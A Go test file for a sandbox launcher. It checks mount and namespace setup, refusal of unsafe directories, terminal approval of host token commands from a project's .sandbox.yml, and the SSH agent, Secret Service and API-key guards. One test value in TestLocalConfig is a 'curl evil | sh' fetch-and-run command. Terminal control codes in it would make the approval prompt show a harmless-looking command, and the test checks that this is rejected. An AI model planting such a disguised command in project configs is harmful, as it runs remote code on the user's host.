package launcher

import (
	"bufio"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"maps"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"golang.org/x/crypto/ssh/agent"

	"github.com/mgnsk/sandbox/internal/guard"
	"github.com/mgnsk/sandbox/internal/secretservice/secretservicetest"
	"github.com/mgnsk/sandbox/internal/testbin"
)

// -- helpers run inside --

// agentList lists the keys of the agent at $SSH_AUTH_SOCK.
func agentList() int {
	conn, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK"))
	if err != nil {
		fmt.Println(err)
		return 1
	}
	keys, err := agent.NewClient(conn).List()
	if err != nil {
		fmt.Println(err)
		return 1
	}
	for _, k := range keys {
		fmt.Println(k.Comment)
	}
	return 0
}

// proxyCheck checks the HTTPS proxy in $$VAR, and the CA bundle: the
// proxy's port, and the answers to a CONNECT with the secret and without.
func proxyCheck() int {
	ca, _ := os.ReadFile(os.Getenv("SANDBOX_CA_FILE"))
	if !strings.HasPrefix(string(ca), "SYSTEM CA BUNDLE\n-----BEGIN CERTIFICATE-----") {
		fmt.Printf("bad bundle %.80q\n", ca)
		return 1
	}
	u, err := url.Parse(os.Getenv(os.Getenv("VAR")))
	if err != nil || u.User.Username() != "sandbox" || u.Hostname() != "127.0.0.1" {
		fmt.Println("bad proxy URL", u, err)
		return 1
	}
	secret, _ := u.User.Password()
	connect := func(secret string) string {
		conn, err := net.Dial("tcp", u.Host)
		if err != nil {
			return err.Error()
		}
		defer conn.Close()
		auth := base64.StdEncoding.EncodeToString([]byte("sandbox:" + secret))
		fmt.Fprintf(conn, "CONNECT 127.0.0.1:9 HTTP/1.1\r\nHost: 127.0.0.1:9\r\nProxy-Authorization: Basic %s\r\n\r\n", auth)
		resp, err := http.ReadResponse(bufio.NewReader(conn), &http.Request{Method: "CONNECT"})
		if err != nil {
			return err.Error()
		}
		return strconv.Itoa(resp.StatusCode)
	}
	fmt.Println(u.Port(), connect(secret), connect("wrong"))
	return 0
}

// waitReady touches $READY, then waits to be stopped.
func waitReady() int {
	os.WriteFile(os.Getenv("READY"), nil, 0o644)
	time.Sleep(time.Minute)
	return 0
}

func (h *harness) tool(name string) string { return filepath.Join(h.tools, name) }

// -- where it runs --

func TestRefusesWhereItMustNotRun(t *testing.T) {
	h := newHarness(t)
	link := filepath.Join(h.tmp, "link")
	os.Symlink(h.home, link)
	for _, dir := range []string{".config", ".ssh/x", ".local/share/sandbox"} {
		os.MkdirAll(filepath.Join(h.home, dir), 0o755)
	}
	for cwd, want := range map[string]string{
		h.home: "it contains $HOME",
		h.tmp:  "it contains $HOME",
		"/":    "it contains $HOME",
		// The check sees the physical path, not a link's logical one.
		link:                             "it contains $HOME",
		filepath.Join(h.home, ".config"): "it is host state under $HOME",
		filepath.Join(h.home, ".ssh/x"):  "it is host state under $HOME",
		filepath.Join(h.home, ".local/share/sandbox"): "it is host state under $HOME",
	} {
		h.run(cwd, map[string]string{"PWD": cwd}).refused(t, want)
	}

	data := filepath.Join(h.tmp, "data")
	os.MkdirAll(filepath.Join(data, "state/vol"), 0o755)
	for _, cwd := range []string{"state", "state/vol", ""} {
		h.run(filepath.Join(data, cwd), map[string]string{"SANDBOX_STATE_DIR": filepath.Join(data, "state")}).
			refused(t, "overlaps the sandbox state dir")
	}

	repo := filepath.Join(h.tmp, "repo")
	os.MkdirAll(filepath.Join(repo, ".git"), 0o755)
	os.Mkdir(filepath.Join(repo, "sub"), 0o755)
	h.run(filepath.Join(repo, "sub"), map[string]string{"SANDBOX_STATE_DIR": filepath.Join(repo, "state")}).
		refused(t, "is in the git work tree")

	// Bound read-write, these would lay the host's sockets (tmux, the
	// session bus, the launcher's own guards) over the sandbox's own /tmp
	// and runtime dir.
	os.Mkdir(filepath.Join(h.runtime, "sub"), 0o755)
	for cwd, want := range map[string]string{
		h.tmpdir:                           "it contains " + h.tmpdir,
		h.runtime:                          "host state in $XDG_RUNTIME_DIR",
		filepath.Join(h.runtime, "sub"):    "host state in $XDG_RUNTIME_DIR",
		filepath.Join(h.tmpdir, "project"): "",
	} {
		os.MkdirAll(cwd, 0o755)
		if r := h.run(cwd, nil); want == "" {
			if r.code != 0 {
				t.Errorf("%s: %q", cwd, r.stderr)
			}
		} else {
			r.refused(t, want)
		}
	}

	// The whole work tree is bound read-write, so a git repo in ~ must not
	// make a project under it bind all of the host home.
	os.Mkdir(filepath.Join(h.home, ".git"), 0o755)
	os.MkdirAll(filepath.Join(h.home, "src/q"), 0o755)
	h.run(filepath.Join(h.home, "src/q"), nil).refused(t, "contains $HOME")
}

func TestProjectAndVolume(t *testing.T) {
	h := newHarness(t)
	h.cfg.Default.Binds = []bind{{Src: "~/x", Mode: "ro"}}
	sub := filepath.Join(h.project, "a/b")
	os.MkdirAll(sub, 0o755)
	r := h.run(sub, nil)
	if r.code != 0 {
		t.Fatal(r.stderr)
	}
	inv := r.pasta(t)
	mounts := inv.mounts()
	// The work tree's top level, not just $PWD, so a subdirectory still
	// gets .git.
	if inv.chdir != sub || mounts[len(mounts)-1] != "--bind "+h.project+" "+h.project {
		t.Errorf("chdir %s, last mount %s", inv.chdir, mounts[len(mounts)-1])
	}
	// The root is made read-only once everything is mounted on it.
	if last := inv.mountArgs[len(inv.mountArgs)-2:]; !slices.Equal(last, []string{"--remount-ro", "/"}) {
		t.Errorf("after the mounts: %q", last)
	}
	// $HOME is nested at its own path in the volume dir, bound before
	// every mount under $HOME, which bwrap layers on top of it.
	volume := h.volume()
	homeBind := slices.Index(mounts, "--bind "+volume+h.home+" "+h.home)
	if homeBind < 0 || !isDir(volume+h.home) || homeBind > slices.Index(mounts, "--ro-bind "+h.home+"/x "+h.home+"/x") {
		t.Errorf("home volume: %q", mounts)
	}
	if fi, _ := os.Stat(volume); fi.Mode().Perm() != 0o700 {
		t.Errorf("volume dir mode %v", fi.Mode())
	}
	// Outside a repo, the project is cwd.
	srv := filepath.Join(h.tmp, "srv/p")
	os.MkdirAll(srv, 0o755)
	if mounts := h.run(srv, nil).pasta(t).mounts(); mounts[len(mounts)-1] != "--bind "+srv+" "+srv {
		t.Errorf("last mount %s", mounts[len(mounts)-1])
	}
}

func TestStateDir(t *testing.T) {
	h := newHarness(t)
	h.run("", map[string]string{"SANDBOX_STATE_DIR": "$HOME/../elsewhere"})
	if !isDir(filepath.Join(h.tmp, "elsewhere", volumeName(h.project))) {
		t.Error("$SANDBOX_STATE_DIR not used")
	}
	h.cfg.StateDir = ""
	h.run("", map[string]string{"XDG_DATA_HOME": filepath.Join(h.tmp, "data")})
	if !isDir(filepath.Join(h.tmp, "data/sandbox", volumeName(h.project))) {
		t.Error("$XDG_DATA_HOME not used")
	}
	h.run("", nil)
	if !isDir(filepath.Join(h.home, ".local/share/sandbox")) {
		t.Error("default not used")
	}
}

// -- what it starts --

func TestNamespacesAndTheBaseFilesystem(t *testing.T) {
	h := newHarness(t)
	inv := h.run("", nil).pasta(t)
	a := inv.args
	for _, flag := range []string{"--unshare-all", "--unshare-user", "--disable-userns", "--share-net", "--die-with-parent", "--clearenv"} {
		if !slices.Contains(a, flag) {
			t.Errorf("no %s", flag)
		}
	}
	opt := func(flag string) string { return a[slices.Index(a, flag)+1] }
	// The project's directory name, for the prompt.
	if got := opt("--hostname"); got != hostName(h.project) {
		t.Errorf("--hostname %q", got)
	}
	if opt("--uid") != strconv.Itoa(os.Getuid()) || opt("--gid") != strconv.Itoa(os.Getgid()) || opt("--cap-drop") != "ALL" {
		t.Errorf("%q", a)
	}
	// Nothing is set before the environment is cleared.
	if slices.Index(a, "--clearenv") > slices.Index(a, "--setenv") {
		t.Error("--setenv before --clearenv")
	}
	fhs := h.cfg.FHS
	for _, m := range []string{
		"--dev /dev", "--proc /proc", "--tmpfs /tmp", "--tmpfs " + h.runtime,
		"--ro-bind /nix /nix",
		"--ro-bind " + fhs.Bin + " /bin",
		"--ro-bind " + fhs.UsrBin + " /usr/bin",
		"--ro-bind " + fhs.NixLd + " " + fhs.LdPath,
		"--ro-bind " + fhs.SSL + " /etc/ssl",
		"--ro-bind-try /etc/hosts /etc/hosts",
	} {
		if !slices.Contains(inv.mounts(), m) {
			t.Errorf("no %s", m)
		}
	}
	if inv.bwrap != "/store/bwrap" || inv.bash != h.cfg.Tools.Bash || inv.seccomp != h.cfg.Seccomp {
		t.Errorf("%+v", inv)
	}
	if !slices.Contains(inv.pasta, "--config-net") || !slices.Contains(inv.pasta, "--host-lo-to-ns-lo") || inv.tcpPorts() != "none" {
		t.Errorf("%q", inv.pasta)
	}
}

func TestInsideEnvironment(t *testing.T) {
	h := newHarness(t)
	h.cfg.Default.Env = map[string]string{"PATH": "/env/bin:$HOME/.nix-profile/bin", "B": "~/x", "E": "$XDG_RUNTIME_DIR/e"}
	got := h.run("", map[string]string{"LANG": "C.UTF-8", "SOME_HOST_VAR": "x"}).pasta(t).setenv()
	want := map[string]string{
		"HOME": h.home, "USER": "u", "LOGNAME": "u", "XDG_RUNTIME_DIR": h.runtime,
		"TERM": "xterm", "LANG": "C.UTF-8",
		"PATH": "/env/bin:" + h.home + "/.nix-profile/bin", "B": h.home + "/x", "E": h.runtime + "/e",
		"SANDBOX_EXCHANGE": filepath.Join(h.volume(), "exchange"),
	}
	if !maps.Equal(got, want) {
		t.Errorf("got  %v\nwant %v", got, want)
	}
	// Fallbacks.
	env := h.run("", map[string]string{"USER": "", "XDG_RUNTIME_DIR": "", "LOGNAME": "logname"}).pasta(t).setenv()
	if env["USER"] != "logname" || env["XDG_RUNTIME_DIR"] != fmt.Sprintf("/run/user/%d", os.Getuid()) {
		t.Errorf("%v", env)
	}
}

// sandbox-bin init first, then a login shell, which runs a given command after
// its startup files.
func TestLoginShellOrCommand(t *testing.T) {
	h := newHarness(t)
	inv := h.run("", nil).pasta(t)
	if inv.command() != nil || filepath.Base(inv.init[0]) != "sandbox-bin" || inv.init[1] != "init" || !slices.Equal(inv.init[4:], []string{"/store/bash", "--login"}) {
		t.Errorf("%q", inv.init)
	}
	r := h.run("", nil, "echo", "hello there")
	if !slices.Equal(r.pasta(t).command(), []string{"echo", "hello there"}) || r.stdout != "hello there\n" {
		t.Errorf("%q %q", r.pasta(t).command(), r.stdout)
	}
	// Options end at the command.
	r = h.run("", nil, "--no-project-config", "echo", "--no-project-config")
	if r.stdout != "--no-project-config\n" {
		t.Errorf("%q", r.stdout)
	}
	if got := h.run("", nil, "--no-project-config", "--", "--weird").pasta(t).command(); !slices.Equal(got, []string{"--weird"}) {
		t.Errorf("%q", got)
	}
	// The exit status is the sandbox's.
	if r := h.run("", map[string]string{"FAKE_PASTA_EXIT": "7"}); r.code != 7 {
		t.Errorf("exit %d", r.code)
	}
	if r := h.run("", nil, "sh", "-c", "exit 3"); r.code != 3 {
		t.Errorf("exit %d", r.code)
	}
	h.run("", nil, "--nope").refused(t, "not defined: -nope (put -- before")
	if r := h.run("", nil, "--help"); r.code != 0 || !strings.Contains(r.stdout, "--no-project-config") || len(r.calls("pasta")) != 0 {
		t.Errorf("--help: exit %d, %q", r.code, r.stdout)
	}
}

func TestInitGetsTheProfiles(t *testing.T) {
	h := newHarness(t)
	target := filepath.Join(h.tmp, "profile-gen")
	os.Mkdir(target, 0o755)
	os.Symlink(target, filepath.Join(h.home, ".nix-profile"))
	h.cfg.Init.NixProfile, h.cfg.Init.HomeManager = true, true
	// The home-manager one doesn't exist.
	if got := h.run("", nil).pasta(t).init[2:4]; !slices.Equal(got, []string{target, ""}) {
		t.Errorf("%q", got)
	}
}

func TestMissingSeccompFilter(t *testing.T) {
	h := newHarness(t)
	h.cfg.Seccomp = filepath.Join(h.tmp, "nope.bpf")
	h.run("", nil).refused(t, "missing seccomp filter")
}

func TestHostPortsAndDNS(t *testing.T) {
	h := newHarness(t)
	h.cfg.HostPorts = []string{"5037", "9000-9010"}
	inv := h.run("", map[string]string{"SANDBOX_HOST_PORTS": "8080/udp, 22/tcp 7"}).pasta(t)
	if inv.tcpPorts() != "5037,9000-9010,22,7" || inv.pastaOpt("-U") != "8080" {
		t.Errorf("%q", inv.pasta)
	}
	h.run("", map[string]string{"SANDBOX_HOST_PORTS": "22/sctp"}).refused(t, "SANDBOX_HOST_PORTS")

	// A resolver on loopback: forwarded, with a resolv.conf for inside over
	// the host's.
	os.WriteFile(h.resolv, []byte("nameserver 127.0.0.53\nsearch lan\n"), 0o644)
	h.cfg.HostEtc = []string{"/etc/resolv.conf"}
	r := h.run("", nil)
	inv = r.pasta(t)
	if inv.pastaOpt("--dns-forward") != dnsForwardAddr || inv.pastaOpt("--dns-host") != "127.0.0.53" {
		t.Errorf("%q", inv.pasta)
	}
	mounts := inv.mounts()
	host := slices.Index(mounts, "--ro-bind-try /etc/resolv.conf /etc/resolv.conf")
	inside := slices.IndexFunc(mounts, func(m string) bool {
		return strings.HasSuffix(m, "/resolv.conf /etc/resolv.conf") && strings.HasPrefix(m, "--ro-bind ")
	})
	if host < 0 || inside < host {
		t.Errorf("%q", mounts)
	}
	if got := r.files()[inv.bind(t, "/etc/resolv.conf")]; got != "nameserver 169.254.1.53\nsearch lan\n" {
		t.Errorf("%q", got)
	}
}

func TestEtcAndExchange(t *testing.T) {
	h := newHarness(t)
	h.cfg.Etc = []etcFile{{Path: "sandbox/AGENTS.md", Source: "/store/AGENTS.md"},
		{Path: "claude-code/managed-settings.json", Source: "/store/settings.json"}}
	exchange := filepath.Join(h.volume(), "exchange")
	os.MkdirAll(filepath.Join(exchange, "sub"), 0o755)
	target := filepath.Join(h.tmp, "host-file")
	os.WriteFile(target, []byte("untouched"), 0o644)
	os.Symlink(target, filepath.Join(exchange, "foo.txt"))
	os.Symlink(target, filepath.Join(exchange, "sub/bar"))
	os.WriteFile(filepath.Join(exchange, "kept.txt"), []byte("host output"), 0o644)
	inv := h.run("", nil).pasta(t)
	for _, want := range []string{"--ro-bind /store/AGENTS.md /etc/sandbox/AGENTS.md",
		"--ro-bind /store/settings.json /etc/claude-code/managed-settings.json"} {
		if !slices.Contains(inv.mounts(), want) {
			t.Errorf("%q not in %q", want, inv.mounts())
		}
	}
	// The host tees into it; a link planted there would aim that write at
	// any host file.
	if !slices.Contains(inv.mounts(), "--ro-bind "+exchange+" "+exchange) || inv.setenv()["SANDBOX_EXCHANGE"] != exchange {
		t.Errorf("%q", inv.mounts())
	}
	var left []string
	filepath.WalkDir(exchange, func(path string, _ os.DirEntry, _ error) error {
		left = append(left, strings.TrimPrefix(path, exchange))
		return nil
	})
	if !slices.Equal(left, []string{"", "/kept.txt", "/sub"}) {
		t.Errorf("left %q", left)
	}
	if fi, _ := os.Stat(exchange); fi.Mode().Perm() != 0o700 {
		t.Errorf("mode %v", fi.Mode())
	}
}

// -- .sandbox.yml --

// withLocal writes the project's .sandbox.yml.
func (h *harness) withLocal(content string) {
	os.WriteFile(filepath.Join(h.project, localConfigFileName), []byte(content), 0o644)
}

func TestApprovalsAreKeptItemByItem(t *testing.T) {
	h := newHarness(t)
	// asks says whether a start asks, and for what; it answers yes.
	asks := func() (shown string, asked bool) {
		t.Helper()
		if r := h.run("", nil); r.code == 0 {
			return "", false
		}
		p := h.pty(nil)
		shown = p.expect("Allow? [y/N] ")
		p.send("y\r")
		if r := p.wait(); r.code != 0 {
			t.Fatalf("%d %q", r.code, r.stdout)
		}
		return shown, true
	}
	token := "github_pat_" + strings.Repeat("t", 30)
	mine, theirs, forgejo := "echo mine"+token, "echo theirs"+token, "echo forgejo"+strings.Repeat("f", 40)
	both := "guards:\n  github:\n    tokenCommand: " + theirs + "\n  forgejo:\n    tokenCommands:\n      codeberg.org: " + forgejo + "\n"
	h.withLocal(both)

	// The user's config has the GitHub command: only Forgejo's is asked
	// about.
	h.cfg.Default.GitHubTokenCommand = mine
	if shown, asked := asks(); !asked || !strings.Contains(shown, forgejo) || strings.Contains(shown, theirs) {
		t.Errorf("with the user's command: %v %q", asked, shown)
	}
	// Without it the file's command is new, and shown with the rest.
	h.cfg.Default.GitHubTokenCommand = ""
	if shown, asked := asks(); !asked || !strings.Contains(shown, forgejo) || !strings.Contains(shown, theirs) {
		t.Errorf("without: %v %q", asked, shown)
	}
	// Both are approved now, whichever is started.
	for _, command := range []string{mine, "", mine, ""} {
		h.cfg.Default.GitHubTokenCommand = command
		if shown, asked := asks(); asked {
			t.Errorf("asked again with %q: %q", command, shown)
		}
	}
	// Asking for less takes no yes; what was dropped is asked about when
	// it's back.
	h.withLocal("guards:\n  github:\n    tokenCommand: " + theirs + "\n")
	if shown, asked := asks(); asked {
		t.Errorf("less: %q", shown)
	}
	h.withLocal(both)
	if shown, asked := asks(); !asked || !strings.Contains(shown, forgejo) {
		t.Errorf("back: %v %q", asked, shown)
	}
	// --no-project-config reads none of it.
	h.withLocal("guards:\n  github:\n    tokenCommand: exit 3\n")
	if r := h.run("", nil, "--no-project-config"); r.code != 0 {
		t.Errorf("--no-project-config: %d %q", r.code, r.stderr)
	}
}

// .sandbox.yml: its token commands are approved first; its git settings
// apply inside without asking.
func TestLocalConfig(t *testing.T) {
	h := newHarness(t)
	mark := filepath.Join(h.tmp, "ran")
	token := "github_pat_" + strings.Repeat("t", 30)
	write := func(content string) {
		os.WriteFile(filepath.Join(h.project, localConfigFileName), []byte(content), 0o644)
	}

	// Git settings alone: nothing to approve.
	write("git:\n  userName: Some One\n  userEmail: a@example.com\n  signingKey: ssh-ed25519 AAAAkey\n")
	r := h.run("", nil)
	env := r.pasta(t).setenv()
	if r.code != 0 || env["GIT_AUTHOR_NAME"] != "Some One" || env["GIT_COMMITTER_EMAIL"] != "a@example.com" ||
		env["GIT_CONFIG_KEY_0"] != "user.signingKey" || env["GIT_CONFIG_VALUE_0"] != "ssh-ed25519 AAAAkey" {
		t.Errorf("git: %d %q %v", r.code, r.stderr, env)
	}

	// A token command: asked first.
	write("guards:\n  github:\n    tokenCommand: touch " + mark + "; echo " + token + "\n  claudeApiKey:\n    tokenCommand: echo " + claudeKey + "\n")
	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, ".sandbox.yml asks to run commands on the host") || exists(mark) {
		t.Errorf("unapproved: %d %q", r.code, r.stderr)
	}
	p := h.pty(nil)
	shown := p.expect("Allow? [y/N] ")
	for _, want := range []string{"for the GitHub token:", "for Claude Code's API key:", "echo " + claudeKey} {
		if !strings.Contains(shown, want) {
			t.Errorf("%q not in %q", want, shown)
		}
	}
	p.send("y\r")
	r = p.wait()
	if r.code != 0 || !exists(mark) {
		t.Errorf("approved: %d %q", r.code, r.stdout)
	}
	if env := r.pasta(t).setenv(); env["ANTHROPIC_UNIX_SOCKET"] == "" {
		t.Errorf("no Claude API guard: %v", env)
	}

	// The signing key from a command: approved like the token commands, its
	// output the key.
	write("git:\n  signingKeyCommand: echo ssh-ed25519 AAAAfromcmd\n")
	p = h.pty(nil)
	if shown := p.expect("Allow? [y/N] "); !strings.Contains(shown, "for git's signing key:") {
		t.Errorf("not shown: %q", shown)
	}
	p.send("y\r")
	if r := p.wait(); r.code != 0 || r.pasta(t).setenv()["GIT_CONFIG_VALUE_0"] != "ssh-ed25519 AAAAfromcmd" {
		t.Errorf("signing key: %d %q", r.code, r.stdout)
	}
	write("git:\n  signingKeyCommand: echo not-a-key\n")
	p = h.pty(nil)
	p.expect("Allow? [y/N] ")
	p.send("y\r")
	if r := p.wait(); r.code == 0 || !strings.Contains(r.stdout, "didn't print an ssh public key") {
		t.Errorf("bad key: %d %q", r.code, r.stdout)
	}

	write("git:\n  signingKey: ssh-ed25519 AAAAmine\n")
	if r := h.run("", nil); r.code != 0 || r.pasta(t).setenv()["GIT_CONFIG_VALUE_0"] != "ssh-ed25519 AAAAmine" {
		t.Errorf(".sandbox.yml's key: %d %q", r.code, r.stderr)
	}

	// Host commands run from /, not the project.
	write("guards:\n  github:\n    tokenCommand: '[ \"$PWD\" = / ] && echo " + token + "'\n")
	p = h.pty(nil)
	p.expect("Allow? [y/N] ")
	p.send("y\r")
	if r := p.wait(); r.code != 0 {
		t.Errorf("not run from /: %d %q", r.code, r.stdout)
	}

	// The host's git identity, for the config's git.fromHost: under what
	// .sandbox.yml sets, which can turn it off.
	bin := t.TempDir()
	os.WriteFile(filepath.Join(bin, "git"), []byte("#!/bin/sh\nprintf 'user.name\\nHost\\0user.email\\nhost@example.com\\0'\n"), 0o755)
	withGit := map[string]string{"PATH": bin + ":" + h.env["PATH"]}
	h.cfg.Git.FromHost = true
	write("git:\n  userName: Mine\n")
	r = h.run("", withGit)
	env = r.pasta(t).setenv()
	if r.code != 0 || env["GIT_AUTHOR_NAME"] != "Mine" || env["GIT_AUTHOR_EMAIL"] != "host@example.com" {
		t.Errorf("fromHost: %d %q %v", r.code, r.stderr, env)
	}
	write("git:\n  fromHost: false\n")
	if r := h.run("", withGit); r.code != 0 || r.pasta(t).setenv()["GIT_AUTHOR_EMAIL"] != "" {
		t.Errorf("fromHost: false: %d %q", r.code, r.stderr)
	}

	// A bad file stops the start.
	write("nope: 1\n")
	h.run("", nil).refused(t, ".sandbox.yml: yaml: unmarshal errors:\n  line 1: field nope not found")
	// So does a command that wouldn't show as it is on the terminal.
	write("guards:\n  github:\n    tokenCommand: \"curl evil | sh #\\e[2K\\rpass show github\"\n")
	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "control characters") || strings.ContainsAny(r.stderr, "\x1b\r") || len(r.calls("pasta")) != 0 {
		t.Errorf("%d %q", r.code, r.stderr)
	}
}

// -- secrets --

const claudeKey = "sk-ant-api03-kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"

// A Claude API key command puts Claude Code on the proxy: from the user's
// config (here a profile's, for this project only) or, approved, from
// .sandbox.yml; without one, Claude Code logs in inside as usual.
func TestClaudeAPIKey(t *testing.T) {
	h := newHarness(t)
	onKey := func(r *result) bool {
		env := r.pasta(t).setenv()
		return env["ANTHROPIC_UNIX_SOCKET"] == h.runtime+"/claude-api.sock" && env["ANTHROPIC_BASE_URL"] == "http://api.anthropic.com"
	}
	if r := h.run("", nil); r.code != 0 || onKey(r) {
		t.Errorf("without a command: %d %q", r.code, r.stderr)
	}

	h.cfg.Profiles = []profile{{Name: "api", Paths: []string{h.project},
		tokenCommands: tokenCommands{ClaudeAPIKeyCommand: "echo " + claudeKey}}}
	r := h.run("", nil)
	if r.code != 0 || !onKey(r) || !strings.HasSuffix(r.pasta(t).bind(t, h.runtime+"/claude-api.sock"), "/claude-api.sock") {
		t.Errorf("profile: %d %q", r.code, r.stderr)
	}
	h.cfg.Profiles[0].ClaudeAPIKeyCommand = "echo 'x y'"
	h.run("", nil).refused(t, "guards.claudeApiKey.tokenCommand (echo 'x y') didn't print a token")

	// From .sandbox.yml: approved first.
	h.cfg.Profiles = nil
	h.withLocal("guards:\n  claudeApiKey:\n    tokenCommand: echo " + claudeKey + "\n")
	p := h.pty(nil)
	if !strings.Contains(p.expect("Allow? [y/N] "), "for Claude Code's API key:") {
		t.Error("not shown")
	}
	p.send("y\r")
	if r := p.wait(); r.code != 0 || !onKey(r) {
		t.Errorf(".sandbox.yml: %d %q", r.code, r.stdout)
	}
}

// Token commands: the user's config's run as they are; .sandbox.yml's only
// once approved on the terminal, asked once and again when they change.
// Either way the token reaches the guard, and a failing command stops the
// start.
func TestTokenCommands(t *testing.T) {
	h := newHarness(t)
	token := "github_pat_" + strings.Repeat("t", 30)
	const proxy = "SANDBOX_GH_PROXY"

	h.cfg.Default.GitHubTokenCommand = "echo " + token
	if r := h.run("", nil); r.code != 0 || r.pasta(t).setenv()[proxy] == "" {
		t.Errorf("config: %d %q", r.code, r.stderr)
	}
	h.cfg.Default.GitHubTokenCommand = "exit 3"
	h.run("", nil).refused(t, "guards.github.tokenCommand (exit 3): exit status 3")
	h.cfg.Default.GitHubTokenCommand = "echo 'not a token'"
	h.run("", nil).refused(t, "didn't print a token")
	// Without a command the guard doesn't run.
	h.cfg.Default.GitHubTokenCommand = ""
	if r := h.run("", nil); r.code != 0 || r.pasta(t).setenv()[proxy] != "" {
		t.Errorf("none: %d %q", r.code, r.stderr)
	}

	mark := filepath.Join(h.tmp, "ran")
	ran := func() bool {
		defer os.Remove(mark)
		return exists(mark)
	}
	command := "touch " + mark + "; echo " + token
	h.withLocal("guards:\n  github:\n    tokenCommand: " + command + "\n")
	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "start the sandbox from a terminal to approve them") || ran() {
		t.Errorf("unapproved: %d %q", r.code, r.stderr)
	}
	p := h.pty(nil)
	shown := p.expect("Allow? [y/N] ")
	for _, want := range []string{"run on this host at each start, for the GitHub token:", "    " + command,
		"the commands run on this host as you, outside the sandbox", "This is asked once, and again only for something new"} {
		if !strings.Contains(shown, want) {
			t.Errorf("%q not in %q", want, shown)
		}
	}
	p.send("y\r")
	if r := p.wait(); r.code != 0 || !ran() {
		t.Errorf("approved: %d %q", r.code, r.stdout)
	}
	if r := h.run("", nil); r.code != 0 || !ran() {
		t.Errorf("asked again: %d %q", r.code, r.stderr)
	}

	// Changed: asked again, and declined, not run.
	command = "touch " + mark + "; echo other" + token
	h.withLocal("guards:\n  github:\n    tokenCommand: " + command + "\n")
	p = h.pty(nil)
	if !strings.Contains(p.expect("Allow? [y/N] "), command) {
		t.Error("change not shown")
	}
	p.send("n\r")
	if r := p.wait(); r.code != 1 || ran() {
		t.Errorf("declined: %d %q", r.code, r.stdout)
	}

	// The user's config wins: the file's is neither asked about nor run.
	h.cfg.Default.GitHubTokenCommand = "echo " + token
	if r := h.run("", nil); r.code != 0 || ran() {
		t.Errorf("config over .sandbox.yml: %d %q", r.code, r.stderr)
	}
}

// -- guards --

// program is what the process pid runs as: its sandbox-bin subcommand, or
// its argv[0].
func program(pid string) string {
	cmdline, _ := os.ReadFile("/proc/" + pid + "/cmdline")
	argv := strings.Split(string(cmdline), "\x00")
	if filepath.Base(argv[0]) == "sandbox-bin" && len(argv) > 1 {
		return argv[1]
	}
	return filepath.Base(argv[0])
}

// children are the pids of pid's child processes running as name.
func children(pid int, name string) []int {
	var found []int
	entries, _ := os.ReadDir("/proc")
	for _, e := range entries {
		stat, err := os.ReadFile("/proc/" + e.Name() + "/stat")
		if err != nil {
			continue
		}
		// pid (comm) state ppid ...
		_, rest, _ := strings.Cut(string(stat), ") ")
		fields := strings.Fields(rest)
		if len(fields) > 1 && fields[1] == strconv.Itoa(pid) && program(e.Name()) == name {
			child, _ := strconv.Atoi(e.Name())
			found = append(found, child)
		}
	}
	return found
}

func TestSSHAgentGuard(t *testing.T) {
	h := newHarness(t)
	h.cfg.Guards.SSHAgent.Enable = true
	r := h.run("", map[string]string{"SSH_AUTH_SOCK": ""})
	if !strings.Contains(r.stderr, "no ssh agent ($SSH_AUTH_SOCK unset), none inside") || r.pasta(t).setenv()["SSH_AUTH_SOCK"] != "" {
		t.Errorf("%q", r.stderr)
	}

	_, priv, _ := ed25519.GenerateKey(rand.Reader)
	keyring := agent.NewKeyring()
	keyring.Add(agent.AddedKey{PrivateKey: priv, Comment: "me@laptop"})
	upstream := filepath.Join(h.home, "agent.sock")
	ln, err := net.Listen("unix", upstream)
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go guard.Serve(ctx, ln, func(c net.Conn) { defer c.Close(); agent.ServeAgent(keyring, c) })

	h.cfg.Guards.SSHAgent.Socket = "~/agent.sock"
	h.cfg.Guards.SSHAgent.Path = "$XDG_RUNTIME_DIR/my-agent.sock"
	r = h.run("", map[string]string{"SSH_AUTH_SOCK": ""}, h.tool("agent-list"))
	inv := r.pasta(t)
	if r.code != 0 || r.stdout != "me@laptop\n" || inv.setenv()["SSH_AUTH_SOCK"] != h.runtime+"/my-agent.sock" {
		t.Errorf("%d %q %q", r.code, r.stdout, r.stderr)
	}
	if !slices.Contains(inv.mounts(), "--ro-bind-try "+h.home+"/.ssh/known_hosts /etc/ssh/ssh_known_hosts") {
		t.Error("no known_hosts")
	}
}

func TestSecretServiceGuard(t *testing.T) {
	h := newHarness(t)
	if !exists(h.cfg.DBusDaemon) {
		t.Skip("needs dbus-daemon")
	}
	hostBus := secretservicetest.Bus(t)
	secretservicetest.Serve(t, hostBus, false)
	h.cfg.Guards.SecretService = true
	r := h.run("", map[string]string{"DBUS_SESSION_BUS_ADDRESS": hostBus})
	if r.code != 0 {
		t.Fatal(r.stderr)
	}
	inv := r.pasta(t)
	if inv.setenv()["DBUS_SESSION_BUS_ADDRESS"] != "unix:path="+h.runtime+"/bus" || !strings.HasSuffix(inv.bind(t, h.runtime+"/bus"), "/bus.sock") {
		t.Errorf("%v", inv.setenv())
	}
	// Only the private bus is bound in, never the host's.
	if strings.Contains(strings.Join(inv.mountArgs, " "), hostBus[len("unix:path="):]) {
		t.Error("host bus bound in")
	}
	// Stopped before its bus, the guard ends quietly.
	if strings.Contains(r.stderr, "bus went away") || strings.Contains(r.stderr, "secret-service-guard") {
		t.Errorf("%q", r.stderr)
	}
}

// With the guard on, a host without a Secret Service doesn't start.
func TestSecretServiceGuardNeedsTheHosts(t *testing.T) {
	h := newHarness(t)
	if !exists(h.cfg.DBusDaemon) {
		t.Skip("needs dbus-daemon")
	}
	h.cfg.Guards.SecretService = true
	r := h.run("", map[string]string{"DBUS_SESSION_BUS_ADDRESS": secretservicetest.Bus(t)})
	if r.code != 1 || !strings.Contains(r.stderr, "no Secret Service (org.freedesktop.secrets) on the host's session bus") ||
		!strings.Contains(r.stderr, "guards.secretService.enable = false") || len(r.calls("pasta")) != 0 {
		t.Errorf("exit %d, stderr %q", r.code, r.stderr)
	}
	h.run("", nil).refused(t, "guards.secretService: no host session bus")
}

